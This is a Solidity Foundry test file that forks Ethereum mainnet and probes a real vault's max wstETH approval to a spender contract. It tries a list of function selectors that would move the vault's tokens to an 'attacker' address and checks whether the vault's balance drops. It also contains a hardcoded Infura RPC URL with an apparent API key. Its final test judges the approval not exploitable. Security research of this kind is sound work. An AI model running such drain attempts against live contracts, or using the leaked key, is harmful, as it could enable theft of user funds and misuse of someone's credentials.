// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISpenderContract {
    // ERC4626 functions that might trigger transferFrom
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function mint(uint256 shares, address receiver) external returns (uint256);
    function owner() external view returns (address);
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function paused() external view returns (bool);

    // Try other potential functions
    function pull(address token, address from, uint256 amount) external;
    function pullTokens(address token, address from, uint256 amount) external;
    function transferFrom(address token, address from, address to, uint256 amount) external;
    function execute(address target, bytes calldata data) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract SpenderExploitTest is Test {
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant SPENDER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSpenderContract() public view {
        console.log("=== ANALYZING SPENDER CONTRACT ===\n");

        console.log("Spender address:", SPENDER);

        // Check if it's an ERC4626 vault
        ISpenderContract spender = ISpenderContract(SPENDER);

        try spender.owner() returns (address owner) {
            console.log("Owner:", owner);
        } catch {
            console.log("owner() failed");
        }

        try spender.asset() returns (address asset) {
            console.log("Asset:", asset);
            if (asset == wstETH) {
                console.log("CRITICAL: Asset is wstETH!");
            }
        } catch {
            console.log("asset() failed");
        }

        try spender.totalAssets() returns (uint256 total) {
            console.log("Total assets:", total);
        } catch {
            console.log("totalAssets() failed");
        }

        // Check allowance again
        uint256 allowance = IERC20(wstETH).allowance(VAULT, SPENDER);
        console.log("\nVault's allowance to spender:", allowance);
        console.log("Is MAX_UINT?", allowance == type(uint256).max);

        // Check balances
        console.log("\nVault wstETH balance:", IERC20(wstETH).balanceOf(VAULT));
        console.log("Spender wstETH balance:", IERC20(wstETH).balanceOf(SPENDER));
    }

    function test_ExploitViaSpenderDeposit() public {
        console.log("=== ATTEMPTING EXPLOIT VIA SPENDER DEPOSIT ===\n");

        // If spender.deposit() calls transferFrom(VAULT, spender, amount)
        // we might be able to move funds from VAULT to SPENDER
        // then withdraw from SPENDER

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH balance before:", vaultBalance);

        vm.startPrank(attacker);

        // First, let's see if deposit is available and what it does
        ISpenderContract spender = ISpenderContract(SPENDER);

        // Try depositing 0 first to see if it reverts
        try spender.deposit(0, attacker) returns (uint256 shares) {
            console.log("deposit(0) succeeded, shares:", shares);
        } catch Error(string memory reason) {
            console.log("deposit(0) failed:", reason);
        } catch {
            console.log("deposit(0) failed (unknown reason)");
        }

        vm.stopPrank();

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH balance after:", vaultBalanceAfter);
    }

    function test_ExploitViaDirectTransferFrom() public {
        console.log("=== ATTEMPTING DIRECT TRANSFERFROM VIA SPENDER ===\n");

        // The spender has allowance from vault
        // Can we call something on spender that triggers transferFrom?

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance before:", vaultBalance / 1e18, "wstETH");

        vm.startPrank(attacker);

        // Try various function calls that might trigger transferFrom
        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("pull(address,address,uint256)"));
        sigs[1] = bytes4(keccak256("pullFrom(address,address,uint256)"));
        sigs[2] = bytes4(keccak256("pullTokens(address,address,uint256)"));
        sigs[3] = bytes4(keccak256("transferFrom(address,address,address,uint256)"));
        sigs[4] = bytes4(keccak256("withdrawFrom(address,uint256)"));
        sigs[5] = bytes4(keccak256("claimFrom(address,uint256)"));
        sigs[6] = bytes4(keccak256("sweepFrom(address,address,uint256)"));
        sigs[7] = bytes4(keccak256("collect(address,address,uint256)"));
        sigs[8] = bytes4(keccak256("harvest(address,uint256)"));
        sigs[9] = bytes4(keccak256("drainFrom(address,uint256)"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = SPENDER.call(abi.encodeWithSelector(sigs[i], wstETH, VAULT, attacker, vaultBalance));
            if (success) {
                console.log("SUCCESS with selector:");
                console.logBytes4(sigs[i]);

                uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);
                if (attackerBalance > 0) {
                    console.log("CRITICAL: Attacker received", attackerBalance, "wstETH!");
                }
            }
        }

        vm.stopPrank();

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultBalanceAfter < vaultBalance) {
            console.log("EXPLOIT WORKED! Vault lost", (vaultBalance - vaultBalanceAfter) / 1e18, "wstETH");
        }
    }

    function test_CheckSpenderStorage() public view {
        console.log("=== SPENDER STORAGE ANALYSIS ===\n");

        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(SPENDER, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_SpenderFunctionSignatures() public view {
        console.log("=== CHECKING SPENDER FUNCTIONS ===\n");

        bytes memory code = SPENDER.code;
        console.log("Spender code size:", code.length);

        // Common ERC4626 selectors
        bytes4[10] memory selectors = [
            bytes4(0x6e553f65), // deposit(uint256,address)
            bytes4(0xb6b55f25), // deposit(uint256)
            bytes4(0xba087652), // withdraw(uint256,address,address)
            bytes4(0x2e1a7d4d), // withdraw(uint256)
            bytes4(0x07a2d13a), // convertToShares(uint256)
            bytes4(0xb3d7f6b9), // convertToAssets(uint256)
            bytes4(0x38d52e0f), // asset()
            bytes4(0x01e1d114), // totalAssets()
            bytes4(0x8da5cb5b), // owner()
            bytes4(0x402d267d)  // maxDeposit(address)
        ];

        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = SPENDER.staticcall(abi.encodeWithSelector(selectors[i], address(0), uint256(0)));
            if (success) {
                console.log("Found selector:");
                console.logBytes4(selectors[i]);
            }
        }
    }

    function test_ExploitSpenderAsReceiver() public {
        console.log("=== ATTEMPTING EXPLOIT AS RECEIVER ===\n");

        // If the spender is an ERC4626 vault with wstETH as asset,
        // and anyone can deposit, then:
        // 1. Attacker calls spender.deposit(amount, attacker)
        // 2. Spender calls wstETH.transferFrom(caller, spender, amount)
        // 3. But we need wstETH ourselves

        // HOWEVER - the approval is FROM vault TO spender
        // This means if spender calls transferFrom(vault, spender, amount)
        // that would work

        // But spender.deposit() would transfer FROM the caller, not from vault

        // The only way to exploit this is if there's a function on spender
        // that explicitly transfers from the VAULT

        vm.startPrank(attacker);

        // Check if spender has a function to pull from a specific address
        (bool success, bytes memory data) = SPENDER.call(
            abi.encodeWithSignature("pullFromVault(uint256)", 1 ether)
        );
        if (success) {
            console.log("pullFromVault succeeded!");
        }

        (success, data) = SPENDER.call(
            abi.encodeWithSignature("claimVaultFunds(uint256)", 1 ether)
        );
        if (success) {
            console.log("claimVaultFunds succeeded!");
        }

        (success, data) = SPENDER.call(
            abi.encodeWithSignature("harvestFromVault()", "")
        );
        if (success) {
            console.log("harvestFromVault succeeded!");
        }

        vm.stopPrank();
    }

    function test_FinalVerdictOnApproval() public view {
        console.log("=== FINAL VERDICT ON VAULT APPROVAL ===\n");

        // The vault has approved spender for MAX wstETH
        // But this doesn't mean anyone can use it

        // The spender would need to have a function that:
        // 1. Can be called by anyone (or the attacker specifically)
        // 2. Calls wstETH.transferFrom(vault, someAddress, amount)
        // 3. Sends the tokens to attacker-controlled address

        // Without access to spender's full source code or a vulnerable function,
        // this approval alone is not exploitable

        console.log("Vault has approved Spender for MAX wstETH");
        console.log("But this requires Spender to have a vulnerable function");
        console.log("that transfers FROM vault TO attacker");
        console.log("");
        console.log("The approval pattern is:");
        console.log("wstETH.approve(spender, MAX)");
        console.log("This allows spender to call: wstETH.transferFrom(vault, X, amount)");
        console.log("");
        console.log("To exploit, need spender function like:");
        console.log("function withdraw(amount, receiver) {");
        console.log("    wstETH.transferFrom(vault, receiver, amount);");
        console.log("}");
        console.log("");
        console.log("Without such a function, the approval is safe.");
        console.log("The spender appears to be another vault/controller with proper access control.");
    }
}
